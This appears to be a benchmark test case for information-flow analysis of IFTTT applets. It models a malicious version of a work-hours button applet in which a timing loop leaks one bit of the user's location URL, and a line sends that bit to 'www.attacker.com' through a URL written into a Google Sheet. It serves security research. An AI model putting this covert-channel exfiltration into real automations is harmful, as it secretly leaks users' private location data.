//Maker: danamerrick
//Link2Applet: https://ifttt.com/applets/227069p-press-a-button-to-track-work-hours-in-google-drive
//Title of Applet: Press a button to track work hours in Google Drive  
//Trigger service: Button Widget
//Action service: Google Sheets
//Policy/Presence: Confidentiality of user location / YES 


location = urlh("DoButton.doButtonNewCommandCommon.LocationMapURL");
timeButtonPress = "DoButton.doButtonNewCommandCommon.OccurredAt";
date = 'Meta.currentUserTime.date()';

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (location.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 


attack = urll("www.attacker.com?" + res);

sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFilename', 'Working hours');
sink('GoogleSheets.appendToGoogleSpreadsheet', 'setFormattedRow', date + ' ||| '+ 'Button pressed at ' + timeButtonPress + ' ||| '+ attack);


